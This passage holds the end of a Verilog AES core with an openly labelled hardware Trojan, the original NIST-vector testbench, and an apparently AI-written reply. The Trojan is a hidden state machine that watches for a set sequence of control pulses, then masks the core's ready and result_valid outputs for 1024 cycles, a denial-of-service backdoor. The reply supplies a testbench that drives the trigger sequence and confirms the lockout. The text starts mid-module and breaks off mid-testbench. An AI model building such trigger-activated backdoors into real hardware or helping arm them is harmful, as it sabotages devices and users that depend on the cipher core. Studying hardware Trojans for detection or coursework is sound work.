              trojan_seq_new = 4'd2;
              trojan_seq_we  = 1'b1;
            end
            else if (!init && !next) begin
              // must keep waiting
              trojan_seq_new = 4'd1;
              trojan_seq_we  = 1'b1;
            end
            else begin
              // Sequence broken, reset.
              trojan_seq_new = 4'd0;
              trojan_seq_we  = 1'b1;
            end
          end
          else if (trojan_seq_reg == 4'd2) begin
            if (init && !next) begin
              trojan_seq_new = 4'd3;
              trojan_seq_we  = 1'b1;
            end
            else if (!init && !next) begin
              trojan_seq_new = 4'd2;
              trojan_seq_we  = 1'b1;
            end
            else begin
              trojan_seq_new = 4'd0;
              trojan_seq_we  = 1'b1;
            end
          end
          else if (trojan_seq_reg == 4'd3) begin
            if (!init && next) begin
              trojan_seq_new = 4'd4;
              trojan_seq_we  = 1'b1;
            end
            else if (!init && !next) begin
              trojan_seq_new = 4'd3;
              trojan_seq_we  = 1'b1;
            end
            else begin
              trojan_seq_new = 4'd0;
              trojan_seq_we  = 1'b1;
            end
          end
          else if (trojan_seq_reg == 4'd4) begin
            if (!init && next) begin
              // TRIGGER THE TROJAN
              trojan_state_new    = TROJAN_ON;
              trojan_state_we     = 1'b1;
              trojan_counter_new  = 10'd0;
              trojan_counter_we   = 1'b1;
              trojan_seq_new      = 4'd0; // reset seq track
              trojan_seq_we       = 1'b1;
            end
            else if (!init && !next) begin
              trojan_seq_new = 4'd4;
              trojan_seq_we  = 1'b1;
            end
            else begin
              trojan_seq_new = 4'd0;
              trojan_seq_we  = 1'b1;
            end
          end
          else begin
            trojan_seq_new = 4'd0;
            trojan_seq_we  = 1'b1;
          end
        end
        TROJAN_ON: begin
          if (trojan_counter_reg < 10'd1023) begin
            trojan_counter_new = trojan_counter_reg + 10'd1;
            trojan_counter_we  = 1'b1;
            // Stay in THIS STATE
            trojan_state_new = TROJAN_ON;
            trojan_state_we  = 1'b0;
          end else begin
            // Done with lockout
            trojan_state_new = TROJAN_OFF;
            trojan_state_we  = 1'b1;
            trojan_counter_new = 10'd0;
            trojan_counter_we  = 1'b1;
            trojan_seq_new = 4'd0;
            trojan_seq_we  = 1'b1;
          end
        end
        TROJAN_TRIG: begin
          // Not used; placeholder for expansion
          trojan_state_new = TROJAN_OFF;
          trojan_state_we  = 1'b1;
          trojan_counter_new = 10'd0;
          trojan_counter_we  = 1'b1;
          trojan_seq_new = 4'd0;
          trojan_seq_we  = 1'b1;
        end
        default: begin
          trojan_state_new = TROJAN_OFF;
          trojan_state_we  = 1'b1;
          trojan_counter_new = 10'd0;
          trojan_counter_we  = 1'b1;
          trojan_seq_new = 4'd0;
          trojan_seq_we  = 1'b1;
        end
      endcase
    end // trojan_fsm

  //----------------------------------------------------------------
  // aes_core_ctrl
  //
  // Control FSM for aes core. Basically tracks if we are in
  // key init, encipher or decipher modes and connects the
  // different submodules to shared resources and interface ports.
  //----------------------------------------------------------------
  always @*
    begin : aes_core_ctrl
      init_state        = 1'b0;
      ready_new         = 1'b0;
      ready_we          = 1'b0;
      result_valid_new  = 1'b0;
      result_valid_we   = 1'b0;
      aes_core_ctrl_new = CTRL_IDLE;
      aes_core_ctrl_we  = 1'b0;

      case (aes_core_ctrl_reg)
        CTRL_IDLE:
          begin
            if (init)
              begin
                init_state        = 1'b1;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_INIT;
                aes_core_ctrl_we  = 1'b1;
              end
            else if (next)
              begin
                init_state        = 1'b0;
                ready_new         = 1'b0;
                ready_we          = 1'b1;
                result_valid_new  = 1'b0;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_NEXT;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_INIT:
          begin
            init_state = 1'b1;

            if (key_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
              end
          end

        CTRL_NEXT:
          begin
            init_state = 1'b0;

            if (muxed_ready)
              begin
                ready_new         = 1'b1;
                ready_we          = 1'b1;
                result_valid_new  = 1'b1;
                result_valid_we   = 1'b1;
                aes_core_ctrl_new = CTRL_IDLE;
                aes_core_ctrl_we  = 1'b1;
             end
          end

        default:
          begin
            // Default assignments to prevent latch inference
            init_state = 1'b0;
            ready_new  = 1'b1;
            ready_we   = 1'b0;
            result_valid_new = 1'b0;
            result_valid_we = 1'b0;
            aes_core_ctrl_new = CTRL_IDLE;
            aes_core_ctrl_we = 1'b0;
          end
      endcase // case (aes_core_ctrl_reg)
    end // aes_core_ctrl

  //----------------------------------------------------------------
  // TROJAN INSERTION: Output masking logic.
  // When the Trojan is active, output ports ready/result_valid are deasserted (system stuck).
  //----------------------------------------------------------------
  assign t_ready        = (trojan_state_reg == TROJAN_ON) ? 1'b0 : ready_reg;
  assign t_result_valid = (trojan_state_reg == TROJAN_ON) ? 1'b0 : result_valid_reg;

endmodule

teatbench:

//======================================================================
//
// tb_aes_core.v
// -------------
// Testbench for the AES block cipher core.
//
//
// Author: Joachim Strombergson
// Copyright (c) 2014, Secworks Sweden AB
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or
// without modification, are permitted provided that the following
// conditions are met:
//
// 1. Redistributions of source code must retain the above copyright
//    notice, this list of conditions and the following disclaimer.
//
// 2. Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in
//    the documentation and/or other materials provided with the
//    distribution.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
// "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
// LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
// FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
// COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
// INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
// BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
// LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
// STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
// ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
//
//======================================================================

`default_nettype none

module tb_aes_core();

  //----------------------------------------------------------------
  // Internal constant and parameter definitions.
  //----------------------------------------------------------------
  parameter DEBUG     = 0;
  parameter DUMP_WAIT = 0;

  parameter CLK_HALF_PERIOD = 1;
  parameter CLK_PERIOD = 2 * CLK_HALF_PERIOD;

  parameter AES_128_BIT_KEY = 0;
  parameter AES_256_BIT_KEY = 1;

  parameter AES_DECIPHER = 1'b0;
  parameter AES_ENCIPHER = 1'b1;


  //----------------------------------------------------------------
  // Register and Wire declarations.
  //----------------------------------------------------------------
  reg [31 : 0] cycle_ctr;
  reg [31 : 0] error_ctr;
  reg [31 : 0] tc_ctr;

  reg            tb_clk;
  reg            tb_reset_n;
  reg            tb_encdec;
  reg            tb_init;
  reg            tb_next;
  wire           tb_ready;
  reg [255 : 0]  tb_key;
  reg            tb_keylen;
  reg [127 : 0]  tb_block;
  wire [127 : 0] tb_result;
  wire           tb_result_valid;


  //----------------------------------------------------------------
  // Device Under Test.
  //----------------------------------------------------------------
  aes_core dut(
               .clk(tb_clk),
               .reset_n(tb_reset_n),

               .encdec(tb_encdec),
               .init(tb_init),
               .next(tb_next),
               .ready(tb_ready),

               .key(tb_key),
               .keylen(tb_keylen),

               .block(tb_block),
               .result(tb_result)
              );


  //----------------------------------------------------------------
  // clk_gen
  //
  // Always running clock generator process.
  //----------------------------------------------------------------
  always
    begin : clk_gen
      #CLK_HALF_PERIOD;
      tb_clk = !tb_clk;
    end // clk_gen


  //----------------------------------------------------------------
  // sys_monitor()
  //
  // An always running process that creates a cycle counter and
  // conditionally displays information about the DUT.
  //----------------------------------------------------------------
  always
    begin : sys_monitor
      cycle_ctr = cycle_ctr + 1;
      #(CLK_PERIOD);
      if (DEBUG)
        begin
          dump_dut_state();
        end
    end


  //----------------------------------------------------------------
  // dump_dut_state()
  //
  // Dump the state of the dump when needed.
  //----------------------------------------------------------------
  task dump_dut_state;
    begin
      $display("State of DUT");
      $display("------------");
      $display("Inputs and outputs:");
      $display("encdec = 0x%01x, init = 0x%01x, next = 0x%01x",
               dut.encdec, dut.init, dut.next);
      $display("keylen = 0x%01x, key  = 0x%032x ", dut.keylen, dut.key);
      $display("block  = 0x%032x", dut.block);
      $display("");
      $display("ready        = 0x%01x", dut.ready);
      $display("result_valid = 0x%01x, result = 0x%032x",
               dut.result_valid, dut.result);
      $display("");
      $display("Encipher state::");
      $display("enc_ctrl = 0x%01x, round_ctr = 0x%01x",
               dut.enc_block.enc_ctrl_reg, dut.enc_block.round_ctr_reg);
      $display("");
    end
  endtask // dump_dut_state


  //----------------------------------------------------------------
  // dump_keys()
  //
  // Dump the keys in the key memory of the dut.
  //----------------------------------------------------------------
  task dump_keys;
    begin
      $display("State of key memory in DUT:");
      $display("key[00] = 0x%016x", dut.keymem.key_mem[00]);
      $display("key[01] = 0x%016x", dut.keymem.key_mem[01]);
      $display("key[02] = 0x%016x", dut.keymem.key_mem[02]);
      $display("key[03] = 0x%016x", dut.keymem.key_mem[03]);
      $display("key[04] = 0x%016x", dut.keymem.key_mem[04]);
      $display("key[05] = 0x%016x", dut.keymem.key_mem[05]);
      $display("key[06] = 0x%016x", dut.keymem.key_mem[06]);
      $display("key[07] = 0x%016x", dut.keymem.key_mem[07]);
      $display("key[08] = 0x%016x", dut.keymem.key_mem[08]);
      $display("key[09] = 0x%016x", dut.keymem.key_mem[09]);
      $display("key[10] = 0x%016x", dut.keymem.key_mem[10]);
      $display("key[11] = 0x%016x", dut.keymem.key_mem[11]);
      $display("key[12] = 0x%016x", dut.keymem.key_mem[12]);
      $display("key[13] = 0x%016x", dut.keymem.key_mem[13]);
      $display("key[14] = 0x%016x", dut.keymem.key_mem[14]);
      $display("");
    end
  endtask // dump_keys


  //----------------------------------------------------------------
  // reset_dut()
  //
  // Toggle reset to put the DUT into a well known state.
  //----------------------------------------------------------------
  task reset_dut;
    begin
      $display("*** Toggle reset.");
      tb_reset_n = 0;
      #(2 * CLK_PERIOD);
      tb_reset_n = 1;
    end
  endtask // reset_dut


  //----------------------------------------------------------------
  // init_sim()
  //
  // Initialize all counters and testbed functionality as well
  // as setting the DUT inputs to defined values.
  //----------------------------------------------------------------
  task init_sim;
    begin
      cycle_ctr = 0;
      error_ctr = 0;
      tc_ctr    = 0;

      tb_clk     = 0;
      tb_reset_n = 1;
      tb_encdec  = 0;
      tb_init    = 0;
      tb_next    = 0;
      tb_key     = {8{32'h00000000}};
      tb_keylen  = 0;

      tb_block  = {4{32'h00000000}};
    end
  endtask // init_sim


  //----------------------------------------------------------------
  // display_test_result()
  //
  // Display the accumulated test results.
  //----------------------------------------------------------------
  task display_test_result;
    begin
      if (error_ctr == 0)
        begin
          $display("*** All %02d test cases completed successfully", tc_ctr);
        end
      else
        begin
          $display("*** %02d tests completed - %02d test cases did not complete successfully.",
                   tc_ctr, error_ctr);
        end
    end
  endtask // display_test_result


  //----------------------------------------------------------------
  // wait_ready()
  //
  // Wait for the ready flag in the dut to be set.
  //
  // Note: It is the callers responsibility to call the function
  // when the dut is actively processing and will in fact at some
  // point set the flag.
  //----------------------------------------------------------------
  task wait_ready;
    begin
      while (!tb_ready)
        begin
          #(CLK_PERIOD);
          if (DUMP_WAIT)
            begin
              dump_dut_state();
            end
        end
    end
  endtask // wait_ready


  //----------------------------------------------------------------
  // wait_valid()
  //
  // Wait for the result_valid flag in the dut to be set.
  //
  // Note: It is the callers responsibility to call the function
  // when the dut is actively processing a block and will in fact
  // at some point set the flag.
  //----------------------------------------------------------------
  task wait_valid;
    begin
      while (!tb_result_valid)
        begin
          #(CLK_PERIOD);
        end
    end
  endtask // wait_valid


  //----------------------------------------------------------------
  // ecb_mode_single_block_test()
  //
  // Perform ECB mode encryption or decryption single block test.
  //----------------------------------------------------------------
  task ecb_mode_single_block_test(input [7 : 0]   tc_number,
                                  input           encdec,
                                  input [255 : 0] key,
                                  input           key_length,
                                  input [127 : 0] block,
                                  input [127 : 0] expected);
   begin
     $display("*** TC %0d ECB mode test started.", tc_number);
     tc_ctr = tc_ctr + 1;

     // Init the cipher with the given key and length.
     tb_key = key;
     tb_keylen = key_length;
     tb_init = 1;
     #(2 * CLK_PERIOD);
     tb_init = 0;
     wait_ready();

     $display("Key expansion done");
     $display("");

     dump_keys();


     // Perform encipher och decipher operation on the block.
     tb_encdec = encdec;
     tb_block = block;
     tb_next = 1;
     #(2 * CLK_PERIOD);
     tb_next = 0;
     wait_ready();

     if (tb_result == expected)
       begin
         $display("*** TC %0d successful.", tc_number);
         $display("");
       end
     else
       begin
         $display("*** ERROR: TC %0d NOT successful.", tc_number);
         $display("Expected: 0x%032x", expected);
         $display("Got:      0x%032x", tb_result);
         $display("");

         error_ctr = error_ctr + 1;
       end
   end
  endtask // ecb_mode_single_block_test


  //----------------------------------------------------------------
  // aes_core_test
  // The main test functionality.
  // Test vectors copied from the follwing NIST documents.
  //
  // NIST SP 800-38A:
  // http://csrc.nist.gov/publications/nistpubs/800-38a/sp800-38a.pdf
  //
  // NIST FIPS-197, Appendix C:
  // https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.197.pdf
  //
  // Test cases taken from NIST SP 800-38A:
  // http://csrc.nist.gov/publications/nistpubs/800-38a/sp800-38a.pdf
  //----------------------------------------------------------------
  initial
    begin : aes_core_test
      reg [255 : 0] nist_aes128_key1;
      reg [255 : 0] nist_aes128_key2;
      reg [255 : 0] nist_aes256_key1;
      reg [255 : 0] nist_aes256_key2;

      reg [127 : 0] nist_plaintext0;
      reg [127 : 0] nist_plaintext1;
      reg [127 : 0] nist_plaintext2;
      reg [127 : 0] nist_plaintext3;
      reg [127 : 0] nist_plaintext4;

      reg [127 : 0] nist_ecb_128_enc_expected0;
      reg [127 : 0] nist_ecb_128_enc_expected1;
      reg [127 : 0] nist_ecb_128_enc_expected2;
      reg [127 : 0] nist_ecb_128_enc_expected3;
      reg [127 : 0] nist_ecb_128_enc_expected4;

      reg [127 : 0] nist_ecb_256_enc_expected0;
      reg [127 : 0] nist_ecb_256_enc_expected1;
      reg [127 : 0] nist_ecb_256_enc_expected2;
      reg [127 : 0] nist_ecb_256_enc_expected3;
      reg [127 : 0] nist_ecb_256_enc_expected4;

      nist_aes128_key1 = 256'h2b7e151628aed2a6abf7158809cf4f3c00000000000000000000000000000000;
      nist_aes128_key2 = 256'h000102030405060708090a0b0c0d0e0f00000000000000000000000000000000;
      nist_aes256_key1 = 256'h603deb1015ca71be2b73aef0857d77811f352c073b6108d72d9810a30914dff4;
      nist_aes256_key2 = 256'h000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f;

      nist_plaintext0 = 128'h6bc1bee22e409f96e93d7e117393172a;
      nist_plaintext1 = 128'hae2d8a571e03ac9c9eb76fac45af8e51;
      nist_plaintext2 = 128'h30c81c46a35ce411e5fbc1191a0a52ef;
      nist_plaintext3 = 128'hf69f2445df4f9b17ad2b417be66c3710;
      nist_plaintext4 = 128'h00112233445566778899aabbccddeeff;

      nist_ecb_128_enc_expected0 = 128'h3ad77bb40d7a3660a89ecaf32466ef97;
      nist_ecb_128_enc_expected1 = 128'hf5d3d58503b9699de785895a96fdbaaf;
      nist_ecb_128_enc_expected2 = 128'h43b1cd7f598ece23881b00e3ed030688;
      nist_ecb_128_enc_expected3 = 128'h7b0c785e27e8ad3f8223207104725dd4;
      nist_ecb_128_enc_expected4 = 128'h69c4e0d86a7b0430d8cdb78070b4c55a;

      nist_ecb_256_enc_expected0 = 128'hf3eed1bdb5d2a03c064b5a7e3db181f8;
      nist_ecb_256_enc_expected1 = 128'h591ccb10d410ed26dc5ba74a31362870;
      nist_ecb_256_enc_expected2 = 128'hb6ed21b99ca6f4f9f153e7b1beafed1d;
      nist_ecb_256_enc_expected3 = 128'h23304b7a39f9f3ff067d8d8f9e24ecc7;
      nist_ecb_256_enc_expected4 = 128'h8ea2b7ca516745bfeafc49904b496089;


      $display("   -= Testbench for aes core started =-");
      $display("     ================================");
      $display("");

      init_sim();
      dump_dut_state();
      reset_dut();
      dump_dut_state();


      $display("ECB 128 bit key tests");
      $display("---------------------");
      ecb_mode_single_block_test(8'h01, AES_ENCIPHER, nist_aes128_key1, AES_128_BIT_KEY,
                                 nist_plaintext0, nist_ecb_128_enc_expected0);

      ecb_mode_single_block_test(8'h02, AES_ENCIPHER, nist_aes128_key1, AES_128_BIT_KEY,
                                 nist_plaintext1, nist_ecb_128_enc_expected1);

      ecb_mode_single_block_test(8'h03, AES_ENCIPHER, nist_aes128_key1, AES_128_BIT_KEY,
                                 nist_plaintext2, nist_ecb_128_enc_expected2);

      ecb_mode_single_block_test(8'h04, AES_ENCIPHER, nist_aes128_key1, AES_128_BIT_KEY,
                                 nist_plaintext3, nist_ecb_128_enc_expected3);


      ecb_mode_single_block_test(8'h05, AES_DECIPHER, nist_aes128_key1, AES_128_BIT_KEY,
                                 nist_ecb_128_enc_expected0, nist_plaintext0);

      ecb_mode_single_block_test(8'h06, AES_DECIPHER, nist_aes128_key1, AES_128_BIT_KEY,
                                 nist_ecb_128_enc_expected1, nist_plaintext1);

      ecb_mode_single_block_test(8'h07, AES_DECIPHER, nist_aes128_key1, AES_128_BIT_KEY,
                                 nist_ecb_128_enc_expected2, nist_plaintext2);

      ecb_mode_single_block_test(8'h08, AES_DECIPHER, nist_aes128_key1, AES_128_BIT_KEY,
                                 nist_ecb_128_enc_expected3, nist_plaintext3);


      ecb_mode_single_block_test(8'h09, AES_ENCIPHER, nist_aes128_key2, AES_128_BIT_KEY,
                                 nist_plaintext4, nist_ecb_128_enc_expected4);

      ecb_mode_single_block_test(8'h0a, AES_DECIPHER, nist_aes128_key2, AES_128_BIT_KEY,
                                 nist_ecb_128_enc_expected4, nist_plaintext4);


      $display("");
      $display("ECB 256 bit key tests");
      $display("---------------------");
      ecb_mode_single_block_test(8'h10, AES_ENCIPHER, nist_aes256_key1, AES_256_BIT_KEY,
                                 nist_plaintext0, nist_ecb_256_enc_expected0);

      ecb_mode_single_block_test(8'h11, AES_ENCIPHER, nist_aes256_key1, AES_256_BIT_KEY,
                                 nist_plaintext1, nist_ecb_256_enc_expected1);

      ecb_mode_single_block_test(8'h12, AES_ENCIPHER, nist_aes256_key1, AES_256_BIT_KEY,
                                 nist_plaintext2, nist_ecb_256_enc_expected2);

      ecb_mode_single_block_test(8'h13, AES_ENCIPHER, nist_aes256_key1, AES_256_BIT_KEY,
                                 nist_plaintext3, nist_ecb_256_enc_expected3);


      ecb_mode_single_block_test(8'h14, AES_DECIPHER, nist_aes256_key1, AES_256_BIT_KEY,
                                 nist_ecb_256_enc_expected0, nist_plaintext0);

      ecb_mode_single_block_test(8'h15, AES_DECIPHER, nist_aes256_key1, AES_256_BIT_KEY,
                                 nist_ecb_256_enc_expected1, nist_plaintext1);

      ecb_mode_single_block_test(8'h16, AES_DECIPHER, nist_aes256_key1, AES_256_BIT_KEY,
                                 nist_ecb_256_enc_expected2, nist_plaintext2);

      ecb_mode_single_block_test(8'h17, AES_DECIPHER, nist_aes256_key1, AES_256_BIT_KEY,
                                 nist_ecb_256_enc_expected3, nist_plaintext3);


      ecb_mode_single_block_test(8'h18, AES_ENCIPHER, nist_aes256_key2, AES_256_BIT_KEY,
                                 nist_plaintext4, nist_ecb_256_enc_expected4);

      ecb_mode_single_block_test(8'h19, AES_DECIPHER, nist_aes256_key2, AES_256_BIT_KEY,
                                 nist_ecb_256_enc_expected4, nist_plaintext4);

      display_test_result();
      $display("");
      $display("*** AES core simulation done. ***");
      $finish;
    end // aes_core_test
endmodule // tb_aes_core

//======================================================================
// EOF tb_aes_core.v
//======================================================================







Here’s a drop-in replacement testbench that (1) fixes the missing `result_valid` port on the DUT, (2) drives the exact trigger sequence `init, next, init, next, next`, and (3) proves the Trojan is ON by showing `ready` and `result_valid` are stuck low for many cycles even while we request work.

I kept all your original NIST tests intact and then added a final “Trojan demo” section. You’ll see clear `$display` lines when the Trojan arms and when masking is observed.

```verilog
//======================================================================
//
// tb_aes_core.v  (modified to TRIGGER and DEMONSTRATE the Trojan)
// -------------
//
//======================================================================

`default_nettype none

module tb_aes_core();

  //----------------------------------------------------------------
  // Internal constant and parameter definitions.
  //----------------------------------------------------------------
  parameter DEBUG     = 0;
  parameter DUMP_WAIT = 0;

  parameter CLK_HALF_PERIOD = 1;
  parameter CLK_PERIOD = 2 * CLK_HALF_PERIOD;

  parameter AES_128_BIT_KEY = 0;
  parameter AES_256_BIT_KEY = 1;

  parameter AES_DECIPHER = 1'b0;
  parameter AES_ENCIPHER = 1'b1;

  // For readable checks of DUT trojan state from TB.
  localparam TROJAN_OFF  = 2'b00;
  localparam TROJAN_TRIG = 2'b01;
  localparam TROJAN_ON   = 2'b10;

  //----------------------------------------------------------------
  // Register and Wire declarations.
  //----------------------------------------------------------------
  reg [31 : 0] cycle_ctr;
  reg [31 : 0] error_ctr;
  reg [31 : 0] tc_ctr;

  reg            tb_clk;
  reg            tb_reset_n;
  reg            tb_encdec;
  reg            tb_init;
  reg            tb_next;
  wire           tb_ready;
  reg [255 : 0]  tb_key;
  reg            tb_keylen;
  reg [127 : 0]  tb_block;
  wire [127 : 0] tb_result;
  wire           tb_result_valid;

  //----------------------------------------------------------------
  // Device Under Test.
  //----------------------------------------------------------------
  aes_core dut(
               .clk(tb_clk),
               .reset_n(tb_reset_n),

               .encdec(tb_encdec),
               .init(tb_init),
               .next(tb_next),
               .ready(tb_ready),

               .key(tb_key),
               .keylen(tb_keylen),

               .block(tb_block),
               .result(tb_result),
               .result_valid(tb_result_valid) // <-- was missing
              );

  //----------------------------------------------------------------
  // clk_gen
  //----------------------------------------------------------------
  always begin : clk_gen
    #CLK_HALF_PERIOD;
    tb_clk = !tb_clk;
  end

  //----------------------------------------------------------------
  // sys_monitor()
  //----------------------------------------------------------------
  always begin : sys_monitor
    cycle_ctr = cycle_ctr + 1;
    #(CLK_PERIOD);
    if (DEBUG) begin
      dump_dut_state();
    end
  end

  //----------------------------------------------------------------
  // dump_dut_state()
  //----------------------------------------------------------------
  task dump_dut_state;
    begin
      $display("State of DUT @%0t", $time);
      $display("encdec=%0d init=%0d next=%0d | ready=%0d result_valid=%0d",
               dut.encdec, dut.init, dut.next, dut.ready, dut.result_valid);
      $display("trojan_state_reg = 0x%0x  (OFF=0, TRIG=1, ON=2)", dut.trojan_state_reg);
      $display("result = 0x%032x", dut.result);
      $display("");
    end
  endtask

  //----------------------------------------------------------------
  // dump_keys()
  //----------------------------------------------------------------
  task dump_keys;
    begin
      $display("State of key memory in DUT:");
      $display("key[00] = 0x%016x", dut.keymem.key_mem[00]);
      $display("key[01] = 0x%016x", dut.keymem.key_mem[01]);
      $display("key[02] = 0x%016x", dut.keymem.key_mem[02]);
      $display("key[03] = 0x%016x", dut.keymem.key_mem[03]);
      $display("key[04] = 0x%016x", dut.keymem.key_mem[04]);
      $display("key[05] = 0x%016x", dut.keymem.key_mem[05]);
      $display("key[06] = 0x%016x", dut.keymem.key_mem[06]);
      $display("key[07] = 0x%016x", dut.keymem.key_mem[07]);
      $display("key[08] = 0x%016x", dut.keymem.key_mem[08]);
      $display("key[09] = 0x%016x", dut.keymem.key_mem[09]);
      $display("key[10] = 0x%016x", dut.keymem.key_mem[10]);
      $display("key[11] = 0x%016x", dut.keymem.key_mem[11]);
      $display("key[12] = 0x%016x", dut.keymem.key_mem[12]);
      $display("key[13] = 0x%016x", dut.keymem.key_mem[13]);
      $display("key[14] = 0x%016x", dut.keymem.key_mem[14]);
      $display("");
    end
  endtask

  //----------------------------------------------------------------
  // reset_dut()
  //----------------------------------------------------------------
  task reset_dut;
    begin
      $display("*** Toggle reset.");
      tb_reset_n = 0;
      #(2 * CLK_PERIOD);
      tb_reset_n = 1;
    end
  endtask

  //----------------------------------------------------------------
  // init_sim()
  //----------------------------------------------------------------
  task init_sim;
    begin
      cycle_ctr = 0;
      error_ctr = 0;
      tc_ctr    = 0;

      tb_clk     = 0;
      tb_reset_n = 1;
      tb_encdec  = 0;
      tb_init    = 0;
      tb_next    = 0;
      tb_key     = {8{32'h00000000}};
      tb_keylen  = 0;
      tb_block   = {4{32'h00000000}};
    end
  endtask

  //----------------------------------------------------------------
  // display_test_result()
  //----------------------------------------------------------------
  task display_test_result;
    begin
      if (error_ctr == 0) begin
        $display("*** All %02d test cases completed successfully", tc_ctr);
      end else begin
        $display("*** %02d tests completed - %02d test cases did not complete successfully.",
                 tc_ctr, error_ctr);
      end
    end
  endtask

  //----------------------------------------------------------------
  // wait_ready()
  //----------------------------------------------------------------
  task wait_ready;
    begin
      while (!tb_ready) begin
        #(CLK_PERIOD);
        if (DUMP_WAIT) dump_dut_state();
      end
    end
  endtask

  //----------------------------------------------------------------
  // wait_valid()
  //----------------------------------------------------------------
  task wait_valid;
    begin
      while (!tb_result_valid) begin
        #(CLK_PERIOD);
      end
    end
  endtask

  //----------------------------------------------------------------
  // ecb_mode_single_block_test()
  //----------------------------------------------------------------
  task ecb_mode_single_block_test(input [7 : 0]   tc_number,
                                  input           encdec,
                                  input [255 : 0] key,
                                  input           key_length,
                                  input [127 : 0] block,
                                  input [127 : 0] expected);
   begin
     $display("*** TC %0d ECB mode test started.", tc_number);
     tc_ctr = tc_ctr + 1;

     // Init the cipher with the given key and length.
     tb_key = key;
     tb_keylen = key_length;
     tb_init = 1;
     #(2 * CLK_PERIOD);
     tb_init = 0;
     wait_ready();

     $display("Key expansion done\n");
     dump_keys();

     // Perform encipher/decipher operation on the block.
     tb_encdec = encdec;
     tb_block  = block;
     tb_next   = 1;
     #(2 * CLK_PERIOD);
     tb_next   = 0;
     wait_ready();

     if (tb_result == expected) begin
       $display("*** TC %0d successful.\n", tc_number);
     end else begin
       $display("*** ERROR: TC %0d NOT successful.", tc_number);
       $display("Expected: 0x%032x", expected);
       $display("Got:      0x%032x\n", tb_result);
       error_ctr = error_ctr + 1;
     end
   end
  endtask

  //----------------------------------------------------------------
  // trojan_drive_sequence()
  // Drives: init, next, init, next, next   (with idle gaps allowed)
  //----------------------------------------------------------------
  task trojan_drive_sequence;
    begin
      $display(">>> Driving Trojan trigger sequence: init, next, init, next, next");

      // Ensure idle baseline
      tb_init = 0; tb_next = 0; #(CLK_PERIOD);

      // Step 1: init==1, next==0
      tb_init = 1; tb_next = 0; #(CLK_PERIOD);
      tb_init = 0; tb_next = 0; #(CLK_PERIOD);

      // Step 2: init==0, next==1
      tb_init = 0; tb_next = 1; #(CLK_PERIOD);
      tb_init = 0; tb_next = 0; #(CLK_PERIOD);

      // Step 3: init==1, next==0
      tb_init = 1; tb_next = 0; #(CLK_PERIOD);
      tb_init = 0; tb_next = 0; #(CLK_PERIOD);

      // Step 4: init==0, next==1
      tb_init = 0; tb_next = 1; #(CLK_PERIOD);
      tb_init = 0; tb_next = 0; #(CLK_PERIOD);

      // Step 5 (trigger): init==0, next==1
      tb_init = 0; tb_next = 1; #(CLK_PERIOD);
      tb_init = 0; tb_next = 0; #(CLK_PERIOD);

      $display(">>> Trigger sequence complete. trojan_state_reg=0x%0x", dut.trojan_state_reg);
    end
  endtask

  //----------------------------------------------------------------
  // prove_trojan_masking()
  // After trigger, request an operation and show ready/result_valid stay 0.
  //----------------------------------------------------------------
  task prove_trojan_masking;
    integer i;
    begin
      $display(">>> Proving Trojan ON causes output masking...");
      // Try to start an encryption; during TROJAN_ON ready & result_valid are forced low.
      tb_encdec = AES_ENCIPHER;
      tb_block  = 128'h00112233445566778899aabbccddeeff;
      tb_next   = 1;
      #(2 * CLK_PERIOD);
      tb_next   = 0;

      // Observe for a window (shorter than 1024 lockout) that nothing completes.
      for (i = 0; i < 64; i = i + 1) begin
        #(CLK_PERIOD);
        if (tb_ready === 1'b1 || tb_result_valid === 1'b1) begin
          $display("*** ERROR: Outputs de-masked unexpectedly at cycle %0d (ready=%0b, valid=%0b)",
                   i, tb_ready, tb_result_valid);
          error_ctr = error_ctr + 1;
          disable prove_trojan_masking;
        end
      end

      if (dut.trojan_state_reg == TROJAN_ON) begin
        $display(">>> Trojan is ON (state=0x%0x). ready=%0b result_valid=%0b (both should be 0).",
                 dut.trojan_state_reg, tb_ready, tb_result_valid);
        $display(">>> Masking observed for ≥64 cycles. Demonstration successful.\n");
      end else begin
        $display("*** ERROR: Trojan did not remain ON as expected (state=0x%0x).",
                 dut.trojan_state_reg);
        error_ctr = error_ctr + 1;
      end
    end
  endtask

  //----------------------------------------------------------------
  // aes_core_test
  //----------------------------------------------------------------
  initial begin : aes_core_test
    reg [255 : 0] nist_aes128_key1;
    reg [255 : 0] nist_aes128_key2;
    reg [255 : 0] nist_aes256_key1;
    reg [255 : 0] nist_aes256_key2;

    reg [127 : 0] nist_plaintext0;
    reg [127 : 0] nist_plaintext1;
    reg [127 : 0] nist_plaintext2;
    reg [127 : 0] nist_plaintext3;
    reg [127 : 0] nist_plaintext4;

    reg [127 : 0] nist_ecb_128_enc_expected0;
    reg [127 : 0] nist_ecb_128_enc_expected1;
    reg [127 : 0] nist_ecb_128_enc_expected2;
    reg [127 : 0] nist_ecb_128_enc_expected3;
    reg [127 : 0] nist_ecb_128_enc_expected4;

    reg [127 : 0] nist_ecb_256_enc_expected0;
